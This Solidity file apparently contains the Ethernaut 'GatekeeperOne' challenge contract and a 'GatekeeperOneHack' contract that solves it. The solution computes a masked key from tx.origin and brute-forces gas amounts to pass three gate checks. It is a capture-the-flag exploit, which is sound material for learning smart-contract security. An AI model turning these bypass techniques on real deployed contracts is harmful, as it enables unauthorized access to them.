// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";

contract GatekeeperOne {
    using SafeMath for uint256;
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft().mod(8191) == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(tx.origin),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(bytes8 _gateKey)
        public
        gateOne
        gateTwo
        gateThree(_gateKey)
        returns (bool)
    {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperOneHack {
    event Entered(bool success);

    address targetContractAddress;

    constructor(address _newTargetContractAddress) public {
        targetContractAddress = _newTargetContractAddress;
    }

    function enterGate() public returns (bool) {
        bytes8 key = bytes8(uint64(tx.origin)) & 0xffffffff0000ffff;

        bool succeeded = false;

        for (uint256 i; i < 120; i++) {
            (bool success, ) = address(targetContractAddress).call.gas(
                i + 150 + 8191 * 3
            )(abi.encodeWithSignature("enter(bytes8)", key));
            if (success) {
                succeeded = success;
                break;
            }
        }
        return succeeded;
    }
}
